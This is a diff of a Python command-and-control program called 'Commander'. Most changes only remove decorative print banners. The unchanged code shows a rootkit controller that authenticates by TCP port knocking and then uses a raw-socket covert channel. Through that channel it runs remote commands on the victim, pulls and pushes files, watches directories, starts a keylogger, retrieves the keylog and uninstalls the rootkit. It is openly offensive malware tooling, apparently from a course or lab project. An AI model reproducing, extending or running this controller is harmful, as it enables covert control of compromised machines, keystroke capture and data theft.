@@ -80,9 +80,6 @@ class Commander:
 
     def perform_port_knock(self):
         """Perform TCP port knock sequence."""
-        print("\n" + "=" * 60)
-        print("PHASE 1: TCP Port Knock Authentication")
-        print("=" * 60)
         print(f"Target:   {self.target_host}")
         print(f"Sequence: {self.knock_ports}")
         print()
@@ -101,15 +98,13 @@ class Commander:
             time.sleep(0.5)
 
         if successful_knocks == len(self.knock_ports):
-            print("\n[+] Port knock sequence complete!")
-            print("[*] Authorization granted for covert channel")
-            print("=" * 60)
+            print("\nPort knock sequence complete!")
+            print("Authorization granted for covert channel")
             time.sleep(1)
             return True
         else:
-            print(f"\n[✗] Knock failed — only {successful_knocks}/{len(self.knock_ports)} ports accepted.")
-            print("[!] Wrong sequence or client not running.")
-            print("=" * 60)
+            print(f"\nKnock failed — only {successful_knocks}/{len(self.knock_ports)} ports accepted.")
+            print(" Wrong sequence or client not running.")
             return False
 
     def send_covert_command(self, command_type, payload=b'', context=None):
@@ -147,18 +142,18 @@ class Commander:
         )
 
         if not success:
-            print(f"[✗] Failed to send packet")
+            print(f"Failed to send packet")
             return False
 
-        print(f"[✓] Packet sent successfully")
+        print(f"Packet sent successfully")
 
         if needs_response:
-            print("[*] Waiting for response...")
+            print("Waiting for response...")
             response = self.receive_response()
             if response:
                 self.display_response(response, context=context)
             else:
-                print("[!] No response received (timeout)")
+                print("No response received (timeout)")
 
         return success
 
@@ -172,8 +167,6 @@ class Commander:
         return response  # may be None on timeout
 
     def display_response(self, response, context=None):
-        """Pretty-print a response dict from receive_data()."""
-        print("\n" + "=" * 60)
         if response['type'] == int(CommandType.ACK):
             # File transfer response save to disk
             if context and context.get('filename'):
@@ -183,48 +176,37 @@ class Commander:
                     with open(save_path, 'wb') as f:
                         f.write(response['payload'])
                     print(f"FILE RECEIVED: {filename}")
-                    print("=" * 60)
                     print(f"  Saved to : {save_path}")
                     print(f"  Size     : {len(response['payload'])} bytes")
                 except Exception as e:
                     print(f"FILE RECEIVE ERROR:")
-                    print("=" * 60)
                     print(f"  Could not save {save_path}: {e}")
             else:
                 # Plain command output (RUN_COMMAND, UNINSTALL, etc.)
                 print("COMMAND OUTPUT:")
-                print("=" * 60)
                 output = response['payload'].decode('utf-8', errors='replace')
                 print(output if output else "(no output)")
         elif response['type'] == int(CommandType.ERROR):
             print("ERROR:")
-            print("=" * 60)
             error = response['payload'].decode('utf-8', errors='replace')
             print(error)
         else:
             print(f"UNKNOWN RESPONSE TYPE: 0x{response['type']:04X}")
-            print("=" * 60)
             print(response['payload'])
-        print("=" * 60)
+
 
     def interactive_session(self):
         """Interactive command session."""
-        print("\n" + "=" * 60)
         print("Commander - Port Knock + Covert Channel")
-        print("=" * 60)
         print(f"Target: {self.target_host}:{self.command_port}")
         print(f"Source: {self.source_ip}")
-        print("=" * 60)
 
         successful_port_knocks = self.perform_port_knock()
 
         if not successful_port_knocks:
             exit()
 
-        print("\n" + "=" * 60)
-        print("PHASE 2: Covert Channel Command Interface")
-        print("=" * 60)
-        print("\nAvailable Commands:")
+        print("\nCommands:")
         print("  knock                 - Re-authenticate via port knock")
         print("  disconnect            - Disconnect from client (0x1234)")
         print("  uninstall             - Uninstall from client (0x2345)")
@@ -234,7 +216,6 @@ class Commander:
         print("  watch <dir>           - Watch directory on client (0x6789)")
         print("  keylog                - Start keylogger (0x9012)")
         print("  exit                  - Exit commander")
-        print("=" * 60)
         print()
 
         while True:
@@ -249,7 +230,7 @@ class Commander:
                 args = parts[1] if len(parts) > 1 else ''
 
                 if cmd == 'exit':
-                    print("[*] Exiting commander...")
+                    print("Exiting commander...")
                     break
 
                 elif cmd == 'knock':
@@ -257,17 +238,17 @@ class Commander:
 
                 elif cmd == 'disconnect':
                     self.send_covert_command(CommandType.DISCONNECT)
-                    print("[*] Disconnect sent — authorization revoked on client")
-                    print("[*] Exiting commander...")
+                    print("Disconnect sent")
+                    print("Exiting commander...")
                     break
 
                 elif cmd == 'uninstall':
                     self.send_covert_command(CommandType.UNINSTALL)
-                    print("[*] Client has uninstalled rootkit")
+                    print("Client has uninstalled rootkit")
 
                 elif cmd == 'send':
                     if not args:
-                        print("[!] Usage: send <filepath>")
+                        print("Usage: send <filepath>")
                         continue
                     try:
                         with open(args, 'rb') as f:
@@ -275,16 +256,16 @@ class Commander:
                         filename       = os.path.basename(args)
                         filename_bytes = filename.encode('utf-8')
                         filename_len   = len(filename_bytes)
-                        print(f"[*] Transferring: {filename} ({len(filedata)} bytes)")
+                        print(f"Transferring: {filename} ({len(filedata)} bytes)")
                         # Payload: filename_length (2 bytes) | filename | filedata
                         payload = struct.pack('!H', filename_len) + filename_bytes + filedata
                         self.send_covert_command(CommandType.TRANSFER_TO_CLIENT, payload)
                     except Exception as e:
-                        print(f"[!] Error reading file: {e}")
+                        print(f"Error reading file: {e}")
 
                 elif cmd == 'get':
                     if not args:
-                        print("[!] Usage: get <filepath>")
+                        print("Usage: get <filepath>")
                         continue
                     self.send_covert_command(
                         CommandType.TRANSFER_FROM_CLIENT,
@@ -294,7 +275,7 @@ class Commander:
 
                 elif cmd == 'run':
                     if not args:
-                        print("[!] Usage: run <command>")
+                        print("Usage: run <command>")
                         continue
                     self.send_covert_command(
                         CommandType.RUN_COMMAND,
@@ -303,7 +284,7 @@ class Commander:
 
                 elif cmd == 'watch':
                     if not args:
-                        print("[!] Usage: watch <path>")
+                        print("Usage: watch <path>")
                         continue
                     self.send_covert_command(
                         CommandType.FILE_WATCH,
@@ -315,12 +296,12 @@ class Commander:
                     self.send_covert_command(CommandType.KEYLOG_START)
                     self._keylog_mode()
                 else:
-                    print(f"[!] Unknown command: {cmd}")
+                    print(f"Unknown command: {cmd}")
 
                 time.sleep(0.3)
 
             except KeyboardInterrupt:
-                print("\n[*] Interrupted — sending disconnect...")
+                print("\nInterrupted — sending disconnect...")
                 try:
                     self.send_covert_command(CommandType.DISCONNECT)
                 except Exception:
@@ -328,13 +309,11 @@ class Commander:
                 break
 
             except Exception as e:
-                print(f"[!] Error: {e}")
+                print(f"Error: {e}")
 
     def _keylog_mode(self):
-        print("\n" + "=" * 60)
-        print("  KEYLOG MODE ACTIVE — commander is locked")
-        print("  Type 'stopkeylog' to stop.")
-        print("=" * 60)
+        print("KEYLOG MODE ACTIVE")
+        print("Type 'stopkeylog' to stop.")
 
         while True:
             try:
@@ -353,25 +332,24 @@ class Commander:
                         b''
                     )
 
-                    print("[*] Waiting for keylog file...")
+                    print("Waiting for keylog file...")
                     response = self.receive_response(timeout=10)  # keylog may be large
                     if response:
                         self.display_response(response, context={"filename": "keylogger.txt"})
                     else:
-                        print("[!] No keylog file received (timeout)")
+                        print("No keylog file received (timeout)")
 
-                    print("[*] Keylog stopped. Resuming normal command mode.")
-                    print("=" * 60)
+                    print("Keylog stopped. Resuming command mode.")
                     break
 
                 elif user_input == '':
                     continue
 
                 else:
-                    print("[!] Keylog mode is active — only 'stopkeylog' is accepted.")
+                    print("Type 'stopkeylog' to stop.")
 
             except KeyboardInterrupt:
-                print("\n[*] Interrupted — stopping keylog and disconnecting...")
+                print("\nInterrupted — stopping keylog and disconnecting...")
                 self.protocol.send_packet(
                     self.source_ip,
                     self.target_host,
@@ -399,10 +377,8 @@ class Commander:
         )
         self._watch_thread.start()
 
-        print("\n" + "=" * 60)
         print("  WATCH MODE ACTIVE — commander is locked")
         print("  Type 'stopwatch' to stop.")
-        print("=" * 60)
 
         while True:
             try:
@@ -417,16 +393,15 @@ class Commander:
                         b''
                     )
                     self._stop_watch_listener()
-                    print("[*] Watch stopped. Resuming normal command mode.")
-                    print("=" * 60)
+                    print("Watch stopped. Resuming normal command mode.")
                     break
                 elif user_input == '':
                     continue
                 else:
-                    print("[!] Watch mode is active — only 'stopwatch' is accepted.")
+                    print("Watch mode is active — only 'stopwatch' is accepted.")
 
             except KeyboardInterrupt:
-                print("\n[*] Interrupted — stopping watch and disconnecting...")
+                print("\nInterrupted — stopping watch and disconnecting...")
                 self.protocol.send_packet(
                     self.source_ip,
                     self.target_host,
@@ -458,7 +433,7 @@ class Commander:
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
             sock.settimeout(1.0)
         except Exception as e:
-            print(f"[!] Watch listener: could not open socket: {e}")
+            print(f"Watch listener: could not open socket: {e}")
             return
 
         chunks        = {}
@@ -554,11 +529,7 @@ class Commander:
             print(f"\n[!] Watch: could not delete file: {e}")
 
 def main():
-    print("=" * 60)
-    print("Commander Program")
-    print("=" * 60)
-    print("Requires: Root/Administrator privileges for raw sockets")
-    print()
+    print("Commander program started...")
 
     if len(sys.argv) < 2:
         print("Usage: sudo python3 commander.py <target_host> [knock_port1 knock_port2 knock_port3]")
@@ -573,7 +544,7 @@ def main():
         try:
             knock_sequence = [int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])]
         except ValueError:
-            print("[!] Knock ports must be integers")
+            print("Knock ports must be integers")
             sys.exit(1)
     else:
         knock_sequence = KNOCK_SEQUENCE  # default [7000, 8000, 9000]
